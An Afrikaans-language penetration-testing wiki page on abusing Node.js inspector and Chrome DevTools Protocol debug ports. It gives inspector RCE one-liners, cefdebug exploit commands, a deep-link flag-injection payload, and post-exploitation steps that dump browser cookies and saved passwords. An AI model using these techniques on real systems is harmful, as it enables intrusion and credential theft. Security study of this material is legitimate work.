# Misbruik van Node inspector/CEF-debugging

{{#include ../../banners/hacktricks-training.md}}

Historiese praktiese voorbeelde sluit die Multimaster-deurloop en die CVE-2019-1414 Visual Studio Code-debuggeraanval in; gebruik hulle as weergawe-spesifieke konteks eerder as om aan te neem dat elke huidige Electron- of Chromium-teiken dieselfde primitives blootstel.<sup>[[1]](#references)[[3]](#references)</sup>

## Basiese inligting

[Uit die dokumentasie](https://nodejs.org/learn/getting-started/debugging): Wanneer ’n Node.js-proses met die `--inspect`-skakelaar begin word, luister dit vir ’n debugging-kliënt. Dit luister **by verstek** op gasheer en poort **`127.0.0.1:9229`**. Elke proses kry ook ’n **unieke** **UUID** toegeken.<sup>[[4]](#references)</sup>

Inspector-kliënte moet die gasheeradres, poort en UUID ken en spesifiseer om te koppel. ’n Volledige URL sal ongeveer soos `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e` lyk.<sup>[[4]](#references)</sup>

> [!WARNING]
> Aangesien die **debugger volle toegang tot die Node.js-uitvoeringsomgewing het**, kan ’n kwaadwillige akteur wat aan hierdie poort kan koppel, moontlik arbitrêre kode namens die Node.js-proses uitvoer (**moontlike voorregte-eskalasie**).<sup>[[4]](#references)</sup>

Daar is verskeie maniere om ’n inspector te begin:<sup>[[4]](#references)</sup>

```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk also pauses at the start of the user script

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```

Wanneer jy 'n proses wat geïnspekteer word, begin, sal iets soos dit verskyn:<sup>[[4]](#references)</sup>

```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```

Prosesse wat op **CEF** (**Chromium Embedded Framework**) gebaseer is, kan ’n debugger met `--remote-debugging-port=9222` beskikbaar stel. Dit stel die blaaier bloot deur die [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) eerder as ’n Node.js-inspekteur, dus is Node.js `process`-gebaseerde payloads nie by verstek direk toepaslik nie.<sup>[[2]](#references)[[5]](#references)</sup>

Wanneer jy ’n blaaier met debugging begin, sal iets soos die volgende verskyn:<sup>[[2]](#references)[[5]](#references)</sup>

```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```

### ’n CDP-eindpunt enumerering en beheer

Die HTTP-ontdekkings-eindpunte onderskei die **browser** WebSocket van individuele **target**- (oortjie, worker, uitbreiding, ens.) WebSockets. Vra `/json/version` vir die browser-eindpunt en `/json/list` vir targets; die teruggestuurde `webSocketDebuggerUrl`-waardes kan dan direk met CDP se JSON-RPC-agtige boodskappe beheer word.<sup>[[5]](#references)</sup>

```bash
# Browser metadata and browser-level WebSocket
curl -s http://127.0.0.1:9222/json/version | jq

# Pages/workers and their target-level WebSockets
curl -s http://127.0.0.1:9222/json/list |
  jq '.[] | {id, type, title, url, webSocketDebuggerUrl}'

BROWSER_WS=$(curl -s http://127.0.0.1:9222/json/version | jq -r .webSocketDebuggerUrl)
PAGE_WS=$(curl -s http://127.0.0.1:9222/json/list | jq -r '[.[] | select(.type=="page")][0].webSocketDebuggerUrl')
```

Byvoorbeeld, koppel met `websocat "$BROWSER_WS"` en stuur `{"id":1,"method":"Target.getTargets"}` of `{"id":2,"method":"Storage.getCookies"}`. Op ’n bladsyteiken (`websocat "$PAGE_WS"`), voer `Runtime.evaluate` in daardie renderer uit en gee `Page.captureScreenshot` ’n base64-gekodeerde skermskoot terug. `document.cookie` kan nie `HttpOnly`-koekies openbaar nie, terwyl `Storage.getCookies` die browser se koekiestoor navraag.<sup>[[5]](#references)</sup>

```json
{"id":3,"method":"Runtime.evaluate","params":{"expression":"({url:location.href,title:document.title,cookie:document.cookie})","returnByValue":true}}
{"id":4,"method":"Page.captureScreenshot","params":{"format":"png"}}
```

### Blaaiers, WebSockets en die same-origin-policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Webwerwe wat in ’n webblaaier oopgemaak word, kan WebSocket- en HTTP-versoeke stuur volgens die blaaiersekuriteitsmodel. ’n **Aanvanklike HTTP-verbinding** is nodig om **’n unieke debugger-sessie-ID te verkry**. Die **same-origin-policy** **verhoed** dat webwerwe **hierdie HTTP-verbinding** kan maak. Vir bykomende sekuriteit teen [**DNS rebinding-aanvalle**](https://en.wikipedia.org/wiki/DNS_rebinding)**,** verifieer Node.js dat die **'Host'-opskrifte** vir die verbinding óf ’n **IP-adres** óf presies **`localhost`** spesifiseer.<sup>[[4]](#references)</sup>

> [!TIP]
> Hierdie **sekuriteitsmaatreël verhoed dat die inspector uitgebuit word** om kode uit te voer deur **bloot ’n HTTP-versoek te stuur** (wat gedoen kan word deur ’n SSRF-kwesbaarheid uit te buit).<sup>[[4]](#references)</sup>

### Inspector in lopende prosesse begin

Jy kan die **sein SIGUSR1** na ’n lopende nodejs-proses stuur om dit die inspector op die verstekpoort te laat **begin**. Let egter daarop dat jy voldoende voorregte moet hê, so dit kan jou **bevoorregte toegang tot inligting binne die proses** gee, maar nie ’n direkte voorregverhoging nie.<sup>[[4]](#references)</sup>

```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```

> [!TIP]
> Dit is nuttig in containers omdat **die proses afskakel en ’n nuwe een begin** met `--inspect` **nie ’n opsie** is nie, want die **container** sal saam met die proses **beëindig** word.<sup>[[6]](#references)</sup>

### Koppel aan inspector/debugger

Om aan ’n **Chromium-gebaseerde blaaier** te koppel, kan die `chrome://inspect`- of `edge://inspect`-URL’s onderskeidelik vir Chrome of Edge besoek word. Deur op die Configure-knoppie te klik, moet seker gemaak word dat die **teiken-gasheer en -poort** korrek gelys is. Die prent wys ’n Remote Code Execution (RCE)-voorbeeld:<sup>[[2]](#references)[[4]](#references)</sup>

![Nadat ’n URL om toegang tot die debugger te verkry verskyn het. bv. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d - Koppel aan inspector/debugger: Om aan ’n Chromium-gebaseerde blaaier te koppel,...](<../../images/image (674).png>)

Met die **opdragreël** kan jy aan ’n debugger/inspector koppel met:<sup>[[2]](#references)[[4]](#references)</sup>

```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```

Die hulpmiddel [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) laat jou toe om inspectors wat plaaslik loop te vind en kode daarin te inject.<sup>[[2]](#references)</sup>

```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```

> [!TIP]
> Let daarop dat **NodeJS RCE exploits nie sal werk** as jy via [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) aan ’n blaaier gekoppel is nie (jy moet die API nagaan om interessante dinge te vind wat jy daarmee kan doen).<sup>[[2]](#references)[[5]](#references)</sup>

## RCE in NodeJS Debugger/Inspector

> [!TIP]
> As jy hier beland het omdat jy wil weet hoe om [**RCE vanaf ’n XSS in Electron te kry, kyk asseblief na hierdie bladsy.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html)

Sommige algemene maniere om **RCE** te verkry wanneer jy aan ’n Node **inspector** kan **koppel**, is om iets soos die volgende te gebruik (dit lyk of dit **nie sal werk met ’n verbinding met Chrome DevTools protocol nie**):<sup>[[2]](#references)</sup>

```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```

## Chrome DevTools Protocol Payloads

Jy kan die API hier nagaan: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/).<sup>[[5]](#references)</sup>
In hierdie afdeling lys ek net interessante dinge wat ek gevind het wat mense gebruik het om hierdie protokol uit te buit.

### Chrome 136+ default-profile restriction

Vanaf **Chrome 136** ignoreer Chrome `--remote-debugging-port` en `--remote-debugging-pipe` wanneer hulle op die **default Chrome data directory** gerig is. Die skakelaar moet saam met ’n nie-standaard `--user-data-dir` gebruik word. Die afsonderlike enkripsiesleutel en geïsoleerde blaaierstaat daarvan verhoed dat die eenvoudige vlaggebaseerde tegniek die gebruiker se gewone geverifieerde profiel blootlê. Daar moet nie sonder verifikasie aanvaar word dat hierdie Chrome-spesifieke beperking ook vir ouer Chrome-weergawes, Chrome for Testing, Electron/CEF-toepassings of ander Chromium-afgeleides geld nie.<sup>[[14]](#references)</sup>

```bash
# Valid current-Chrome debugging setup, but this is a new isolated profile
google-chrome --remote-debugging-port=9222 --user-data-dir=/tmp/chrome-cdp-lab
```

Daarom bewys die feit dat ’n huidige Chrome-proses slegs met `--remote-debugging-port` geloods is **nie** dat CDP aktief geword het nie. Bevestig die luisteraar en `/json/version`, en bepaal watter profiel dit werklik gebruik.<sup>[[14]](#references)</sup>

### Parameter Injection via Deep Links

In [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) het Rhino Security ontdek dat ’n toepassing gebaseer op CEF ’n pasgemaakte URI in die stelsel geregistreer het (workspaces://index.html), wat die volledige URI ontvang het en daarna die CEF-gebaseerde toepassing geloods het met ’n konfigurasie wat gedeeltelik uit daardie URI saamgestel is.<sup>[[8]](#references)</sup>

Daar is ontdek dat die URI-parameters URL-gedekodeer is en gebruik is om die CEF-basistoepassing te loods, waardeur ’n gebruiker die vlag **`--gpu-launcher`** op die **opdragreël** kon **inject** en arbitrêre dinge kon uitvoer.<sup>[[8]](#references)</sup>

Dus, ’n payload soos:

```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```

Sal 'n calc.exe uitvoer.<sup>[[8]](#references)</sup>

### Lêers oorskryf

Verander die vouer waar **afgelaaide lêers gestoor gaan word** en laai 'n lêer af om die gereeld gebruikte **bronkode** van die toepassing met jou **kwaadwillige kode** te **oorskryf**.<sup>[[5]](#references)[[6]](#references)</sup>

```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
  JSON.stringify({
    id: 42069,
    method: "Browser.setDownloadBehavior",
    params: {
      behavior: "allow",
      downloadPath: "/code/",
    },
  })
)
```

### Webdriver RCE en data-eksfiltrasie

STAR Labs het gewys dat blootgestelde WebDriver/CDP-dienste arbitrêre lêerlesings en RCE kan moontlik maak; DNS rebinding kan in sommige konfigurasies die ontginningsketting voltooi.<sup>[[9]](#references)</sup>

ChromeDriver se WebDriver-diens verskil van Chrome DevTools/CDP. Sy [`goog:chromeOptions.binary`-vermoë](https://developer.chrome.com/docs/chromedriver/capabilities) kies die blaaieruitvoerbare lêer wat vir ’n nuwe sessie geloods word. As ’n onbevoorregte oproeper ’n ChromeDriver-diens kan bereik wat as root loop, en ’n sessie met ’n uitvoerbare lêerpad wat deur die oproeper beheer word indien, kan daardie loodsaksie die diens se voorreggrens oorsteek. ’n Leë `/sessions`-antwoord bepaal nie of nuwe sessies geskep kan word nie. Inspekteer die proseseienaar, werklike bereikbaarheid van die luisteraar, sessiemagtiging, toegang tot die uitvoerbare lêer en inperking voordat jy besluit of die pad bruikbaar is; ’n prosesnaam of gewone poort alleen is onvoldoende. [Google se sekuriteitsriglyne](https://developer.chrome.com/docs/chromedriver/security-considerations) beveel aan dat ChromeDriver onder ’n onbevoorregte rekening loop. Passiewe enumerasie behoort nie ’n WebDriver-sessie te skep nie.

Vir verdere historiese gevalle van blaaieroutomatisering en Chromium-sekuriteit, sien die Counter WebDriver-skryfstuk en Project Zero-kwessies 773, 1742 en 1944.<sup>[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)</sup>

### CDP in ’n lewendige Chromium-proses aktiveer

Chrome se verstekprofielbeperking blokkeer slegs die aktiveringspad via die opdragreël. Met voldoende toegang as dieselfde gebruiker om die blaaierproses te manipuleer, roep die oorspronklike [**CDP-Enabler**](https://github.com/deathflamingo/CDP-Enabler) en die Cobalt Strike [**CDP-Enable-BOF**](https://github.com/kingofthenops/CDP-Enable-BOF) Chromium se nie-uitgevoerde `content::DevToolsAgentHost::StartRemoteDebuggingServer` binne die reeds lopende `chrome.exe` of `msedge.exe` aan. Die eindpunt behoort dus aan die werklike profiel en behou sy oortjies, uitbreidings, koekies en geverifieerde toestand.<sup>[[15]](#references)[[16]](#references)[[18]](#references)</sup>

Vir gewone x64 Chrome/Edge-prosesse vind die BOF die blaaiervenster en gelaaide `chrome.dll`/`msedge.dll`, skandeer die afgeleë PE vir gemaskerde handtekeninge, ken geheuestukke vir stubs en ’n konteksblok toe, vervang die vensterprosedure tydelik en stuur die finale oproep op die blaaier se **UI-draad**. Die relevante looptydinsette is `StartRemoteDebuggingServer`, Chromium se `operator new`, `TCPServerSocketFactory::CreateForHttpServer` en die fabrieks-vtable. Uitvoering stop tensy elke verpligte handtekening ’n unieke passing het.<sup>[[15]](#references)[[16]](#references)</sup>

Die BOF aanvaar ’n blaaiermodus en ’n opsionele poort. Sy hulpskrip kan dan die eindpunt verifieer en koekies versamel; `chrome-iso` is ’n afsonderlike pad vir Chrome se Windows Process Isolation-grens.<sup>[[16]](#references)</sup>

```text
cdp-enable chrome
cdp-enable edge 9301
cdp-enable chrome-iso
python .\grab_cookies.py --port 9222 --output cookies.json
```

Die `chrome-iso`-pad gebruik slegs handvatsels met beperkte navraagtoegang tot die geïsoleerde proses. Dit identifiseer die geïnstalleerde `chrome.dll` waarvan die PE-beeldgrootte ooreenstem met dié van die lewendige proses, los simbole vanaf daardie plaaslike beeld op en gebruik Chromium se `WindowImpl`-versending, tesame met sinchrone `WM_COPYDATA` en ’n bestaande User32-hook in die beeld, om die UI-thread te bereik.<sup>[[16]](#references)</sup>

> [!WARNING]
> Dit is ’n tegniek vir **manipulering van ’n blaaierproses ná kompromittering**, nie ’n netwerk-omseiling sonder verifikasie nie. Dit is afhanklik van die bouweergawe, omdat die betrokke C++-simbole nie uitgevoer word nie en ná blaaieropdaterings kan verander.<sup>[[15]](#references)[[16]](#references)[[18]](#references)</sup>

#### Handtekeninge verfris ná blaaieropdaterings

Gebruik die presiese weergawe van `chrome.dll` of `msedge.dll` wat op die teiken geïnstalleer is, en die ooreenstemmende PDB. `symchk.exe` van die Windows SDK laai die simbole af; die bewaarplekskripte vind dan `StartRemoteDebuggingServer`, lei die allocator/socket-factory-insette af, of valideer elke handtekening wat in die BOF ingebed is.<sup>[[16]](#references)[[18]](#references)</sup>

```powershell
# Run from a directory containing the exact target DLL
& 'C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\symchk.exe' /v chrome.dll /s 'srv*C:\symbols*https://chromium-browser-symsrv.commondatastorage.googleapis.com'
symchk /v /ocx edge-symchk.txt /s 'SRV*C:\symbols*https://msdl.microsoft.com/download/symbols' .\msedge.dll

python .\find_start_server.py .\chrome.dll 'C:\symbols\...\chrome.dll.pdb'
python .\find_cdp_inputs.py .\chrome.dll 'C:\symbols\...\chrome.dll.pdb'
python .\find_cdp_inputs.py .\chrome.dll --validate-bof-signatures
```

'n Nul-treffer- of meervoudige-trefferresultaat moet nie met 'n arbitrêre adres vervang word nie. As 'n bekende `operator new`- of `CreateForHttpServer`-patroon te veel verander het om 'n nuwe masker te skep, gebruik `pe_signature_finder.py` met die PDB om daardie simbool te ondersoek en 'n greepvolgorde af te lei wat uniek is in die teikenmodule.<sup>[[16]](#references)[[18]](#references)</sup>

#### Onttrekking uit geverifieerde blaaier met CDP Toolkit

Hierdie tegniek dekripteer nie App-Bound Encryption (ABE) vanlyn nie en verwyder ook nie toestelbinding nie. Dit behandel eerder die wettige blaaier as 'n **dekripsie-orakel en geverifieerde interaksie-instaanbediener**: `Storage.getCookies` vra die lewendige blaaier vir sy koekiestoor, terwyl navigasie-/skermuitsending-werkstrome versoeke, berging, ondernemingsverifikasie en toestelgebonde gedrag binne die slagoffer se bestaande blaaier hou.<sup>[[17]](#references)[[18]](#references)</sup>

Nadat die loopback-CDP-luisteraar deur die operateur se pivot herlei is, kan [**CDP Toolkit**](https://github.com/kingofthenops/CDP-toolkit) algemene artefakte opnoem en versamel.<sup>[[17]](#references)[[18]](#references)</sup>

```powershell
pip install -e .
cdptk discover --cdp-endpoint http://127.0.0.1:9222
cdptk tabs list --cdp-endpoint http://127.0.0.1:9222
cdptk cookies dump --cdp-endpoint http://127.0.0.1:9222 --out cookies.json
cdptk tabs screenshot 1 --cdp-endpoint http://127.0.0.1:9222 --out tab.png
cdptk history search azure --cdp-endpoint http://127.0.0.1:9222 --limit 50
cdptk bookmarks list --cdp-endpoint http://127.0.0.1:9222 --out bookmarks.json
cdptk saved-passwords list --cdp-endpoint http://127.0.0.1:9222
cdptk extensions list --cdp-endpoint http://127.0.0.1:9222
```

`discover`, `tabs list`, `cookies dump` en `tabs screenshot` is meestal omhulsels om `/json/version`, die teikenlys, `Storage.getCookies` en `Page.captureScreenshot`. History, bookmarks, extensions en password metadata vereis eerder ’n tydelike `chrome://`/`edge://` WebUI-teiken: die toolkit wag dat die oppervlak weergegee word, ondersoek die model of DOM, versamel die resultaat en sluit die teiken.<sup>[[17]](#references)[[18]](#references)</sup>

`saved-passwords dump` gaan verder: dit open die oorspronklike gestoorde-aanmeldingsbron, fokus ’n credential-veld, kies die inheemse autofill-voorstel met behulp van CDP-invoergebeure en lees die ingevulde waardes. Die oorsprong/poort/pad moet nou ooreenstem met die gestoorde-password realm; sigbare modus is die betroubare verstek omdat die voorstel-opspringvenster inheemse browser-UI is.<sup>[[17]](#references)[[18]](#references)</sup>

Vir regstreekse interaksie stroom `browser-takeover screencast` rame en stuur dit invoer na ’n regte teiken (insluitend agtergrond- of buiteskermmodusse). `browser-takeover proxy` aanvaar eerder HTTP en HTTPS `CONNECT` plaaslik en stuur stroomop-versoeke deur versteekte Chrome-teikens; waar versteekte teikens nie beskikbaar is nie, gebruik dit agtergrond-oortjies. Dit behou die slagoffer se netwerk-/verifikasiekonteks, maar is minder getrou vir komplekse kliëntkanttoepassings omdat die operateur se browser die teruggestuurde inhoud weergee.<sup>[[17]](#references)[[18]](#references)</sup>

Moenie vir opsporing net op `--remote-debugging-*`-opdragreëltelemetrie staatmaak nie: korreleer ook ongewone handvatsels en geheuebewerkings teen browser-prosesse (`PROCESS_VM_OPERATION`, `PROCESS_VM_WRITE`, thread-skepping), DLL-inspuiting en onverwagte luister-sokke op die loopback-koppelvlak wat deur Chrome/Edge besit word.<sup>[[15]](#references)</sup>

### Post-Exploitation

In ’n regte omgewing en **nadat ’n gebruiker se rekenaar gekompromitteer is** waarop ’n Chromium-gebaseerde browser gebruik word, was ’n historiese tegniek om die browser weer te begin met debugging geaktiveer en die loopback-poort aan te stuur. Dit kan die slagoffer se blaaitoestand blootstel op produkte/weergawes wat steeds die gekose profiel aanvaar, maar Chrome 136+ sal dit nie op sy verstekdatagids toepas nie.<sup>[[7]](#references)[[14]](#references)</sup>

Die oorspronklike herbeginopdrag word hieronder behou vir ouer/weergawespesifieke teikens. Die tweede opdrag is die huidige, ondersteunde Chrome-vorm, maar skep ’n geïsoleerde profiel eerder as om die slagoffer se normale geverifieerde toestand te heropen.<sup>[[7]](#references)[[14]](#references)</sup>

```powershell
# Historical: verify whether the target actually honors it
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"

# Current Chrome: CDP works, but against a new profile
Start-Process "Chrome" "--remote-debugging-port=9222 --user-data-dir=$env:TEMP\chrome-cdp"
```

Vir macOS-spesifieke Chromium-herbegin-, uitbreiding- en CDP-tegnieke, sien [macOS Chromium Injection](../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-chromium-injection.md).



## References

- [1] [HackTheBox - Multimaster (IppSec)](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [2] [taviso/cefdebug - CEF/Chromium-ontfouterinspeksie- en uitbuitingsnutsding](https://github.com/taviso/cefdebug)
- [3] [CVE-2019-1414: Afstandkode-uitvoering in Visual Studio Code via Chrome DevTools Debugger](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [4] [Node.js-ontfoutingsgids - Aan die gang](https://nodejs.org/learn/getting-started/debugging)
- [5] [Chrome DevTools Protocol](https://chromedevtools.github.io/devtools-protocol/)
- [6] [corCTF 2021-skrywe - saasme (Larry Yuan)](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [7] [Na-uitbuiting: Misbruik van Chrome se ontfoutingsfunksie om blaaisessies op afstand waar te neem en te beheer](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
- [8] [CVE-2021-38112: Afstandkode-uitvoering in AWS WorkSpaces](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)
- [9] [Praat jy met my? - WebDriver RCE via DNS-herbinding en CDP (STAR Labs)](https://starlabs.sg/blog/2021/04-you-talking-to-me/)
- [10] [Counter Webdriver - Van Bot tot RCE](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)
- [11] [Google Project Zero-kwessie 773 (Chromium-foutnaspoorder)](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [12] [Google Project Zero-kwessie 1742 (Chromium-foutnaspoorder)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [13] [Google Project Zero-kwessie 1944 (Chromium-foutnaspoorder)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
- [14] [Veranderinge aan skakelaars vir afstandontfouting om sekuriteit te verbeter - Chrome for Developers](https://developer.chrome.com/blog/remote-debugging-port)
- [15] [CDP in ’n lopende Edge-blaaier inspuit: ’n Diepgaande blik op blaaierinstrumentasie tydens uitvoering](https://deathflamingo.com/blog/cdp_enabler/)
- [16] [kingofthenops/CDP-Enable-BOF](https://github.com/kingofthenops/CDP-Enable-BOF)
- [17] [kingofthenops/CDP-toolkit](https://github.com/kingofthenops/CDP-toolkit)
- [18] [SpecterOps - Die Koekie-monster keer terug](https://specterops.io/blog/2026/08/13/chrome-devtools-protocol-cookie-theft/)
{{#include ../../banners/hacktricks-training.md}}
